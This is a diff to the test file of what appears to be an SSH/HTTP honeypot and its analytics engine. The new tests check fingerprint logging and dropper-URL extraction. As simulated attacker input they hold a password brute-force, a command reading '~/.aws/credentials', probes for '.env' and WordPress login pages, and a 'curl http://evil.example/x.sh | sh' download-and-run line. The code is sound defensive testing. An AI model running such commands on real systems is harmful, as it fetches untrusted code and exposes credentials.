@@ -35,6 +35,7 @@ def decoy_config(temp_dir, telemetry_path, **kw):
     return DecoyConfig(ssh_port=0, http_port=0, telemetry_path=telemetry_path,
                        regime_schedule_path=os.path.join(temp_dir, "sched.csv"),
                        auth_path=os.path.join(temp_dir, "auth.csv"),
+                       signals_path=os.path.join(temp_dir, "signals.csv"),
                        ssh_host_key_path=os.path.join(temp_dir, "host_key"), **kw)
 
 
@@ -142,6 +143,11 @@ def test_a5_ssh_bruteforce_then_interactive_shell(temp_env):
             t = paramiko.Transport(("127.0.0.1", port))
             t.connect()
             banner = t.remote_version
+            if not attempts:  # offer an SSH key first, as many bots do; it must be refused and logged
+                try:
+                    t.auth_publickey("admin", paramiko.RSAKey.generate(1024))
+                except paramiko.AuthenticationException:
+                    pass
             try:
                 t.auth_password("admin", password)
                 attempts.append(True)
@@ -183,6 +189,13 @@ def test_a5_ssh_bruteforce_then_interactive_shell(temp_env):
     assert {"hunter2", "letmein"} & set(auth["password"])
     assert auth["accepted"].iloc[-1]
     assert auth["client_version"].str.startswith("SSH-2.0-paramiko").all()
+
+    signals = pd.read_csv(os.path.join(temp_dir, "signals.csv"))
+    hassh_values = signals[signals["kind"] == "hassh"]["value"]
+    assert hassh_values.str.fullmatch(r"[0-9a-f]{32}").all() and len(hassh_values) == 3  # one per connection
+    assert signals[signals["kind"] == "pubkey"]["value"].str.startswith("admin:SHA256:").all()
+    assert list(signals[signals["kind"] == "login_attempt"]["value"]) == [
+        "admin:hunter2", "admin:letmein", "admin:Winter2024!"]
 
     telemetry = pd.read_csv(telemetry_path)
     assert list(telemetry["command_raw"]) == ["whoami", "cat ~/.aws/credentials"]
@@ -244,6 +257,10 @@ def test_a7_http_decoy(temp_env):
     auth = pd.read_csv(os.path.join(temp_dir, "auth.csv"))
     assert list(auth[["protocol", "username", "password"]].iloc[0]) == ["HTTP", "admin", "<script>x</script>"]
 
+    signals = pd.read_csv(os.path.join(temp_dir, "signals.csv"))
+    assert set(signals["kind"]) == {"header_order", "user_agent"} and len(signals) == 2  # once per session
+    assert signals[signals["kind"] == "user_agent"]["value"].iloc[0].startswith("Python-urllib")
+
     telemetry = pd.read_csv(telemetry_path)
     assert telemetry["session_id"].nunique() == 1
     assert list(telemetry["command_raw"]) == ["GET /", "GET /.env", "GET /wp-admin/", "GET /wp-login.php",
@@ -271,3 +288,24 @@ def test_a8_delta_t_excludes_injected_delay(temp_env):
     asyncio.run(scenario())
     dts = pd.read_csv(telemetry_path)["delta_t_ns"].iloc[1:] / 1e6
     assert (dts >= 45).all() and (dts < 95).all(), list(dts)
+
+
+def test_a9_engine_joins_signals_and_urls(temp_env):
+    """Test A9: sessions.csv carries HASSH/user-agent signals and dropper URLs from the commands."""
+    from src.analytics import CERFEngine
+    temp_dir, telemetry_path = temp_env
+    rows = [dict(session_id="s1", timestamp_ns=i, source_ip="9.9.9.9", protocol="SSH", command_index=i,
+                 command_raw=c, command_root=c.split()[0], current_path="/", regime="baseline",
+                 delta_t_ns=1000, response_sent=True)
+            for i, c in enumerate(["uname -a", "wget http://evil.example/x.sh -O /tmp/x", "curl http://evil.example/x.sh | sh"])]
+    pd.DataFrame(rows).to_csv(telemetry_path, index=False)
+    signals_path = os.path.join(temp_dir, "signals.csv")
+    from src.decoy.signals import SignalLogger
+    log = SignalLogger(signals_path)
+    log.log("s1", "9.9.9.9", "SSH", "hassh", "a" * 32)
+    log.log("s1", "9.9.9.9", "SSH", "pubkey", "root:SHA256:abc")
+    sessions = CERFEngine(telemetry_path=telemetry_path, output_dir=temp_dir, embedding="pca",
+                          signals_path=signals_path).run_pipeline()
+    row = sessions.iloc[0]
+    assert row["hassh"] == "a" * 32 and row["pubkeys"] == "root:SHA256:abc" and row["user_agent"] == ""
+    assert row["download_urls"] == "http://evil.example/x.sh"
